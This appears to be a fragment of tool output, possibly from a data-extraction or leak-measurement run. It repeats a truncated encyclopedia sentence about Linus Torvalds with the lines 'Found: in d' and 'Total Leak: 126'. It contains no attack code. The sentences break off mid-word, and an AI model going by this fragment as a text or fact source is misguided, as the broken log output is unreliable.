Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and, historically, the main
---
Found: in d
Total Leak: 126
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and, historically, the main d
```